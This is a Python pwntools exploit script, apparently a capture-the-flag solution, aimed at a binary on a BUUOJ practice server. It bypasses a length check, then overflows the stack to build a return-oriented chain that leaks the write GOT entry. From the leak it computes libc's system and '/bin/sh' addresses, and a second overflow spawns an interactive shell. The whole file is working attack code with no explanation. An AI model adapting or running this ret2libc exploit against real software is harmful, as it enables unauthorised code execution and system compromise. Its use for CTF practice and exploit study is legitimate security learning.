#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from LibcSearcher import *

sh = process('./pwn')
sh = remote("node3.buuoj.cn", 29487)
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
context.log_level = 'debug'

# ret = 0x08048502
write_plt = elf.symbols['write']
write_got = elf.got['write']
write_libc = libc.symbols['write']
system_libc = libc.symbols['system']
bin_sh_libc = libc.search("/bin/sh").next()
log.info("bin_sh_libc -> " + hex(bin_sh_libc))
start = 0x080485A0

payload = '\x00' * 7 + '\xff'

sh.sendline(payload)

# gdb.attach(sh)
payload = 'a' * 0xe7 + 'b' * 4 + p32(write_plt) + p32(start) + p32(1) + p32(write_got) + p32(4)
sh.sendline(payload)
sh.recvuntil("Correct\n")
write_addr = u32(sh.recv(4))
log.success("Write_addr -> " + hex(write_addr))

offset = write_addr - write_libc
bin_sh = offset + bin_sh_libc
system_addr = offset + system_libc
log.info("system_addr -> " + hex(system_addr))
log.info("bin_sh -> " + hex(bin_sh))

payload = '\x00' * 7 + '\xff'
sh.sendline(payload)

payload = 'a' * 0xe7 + 'b' * 4 + p32(system_addr) + p32(start) + p32(bin_sh)
sh.sendline(payload)

sh.interactive()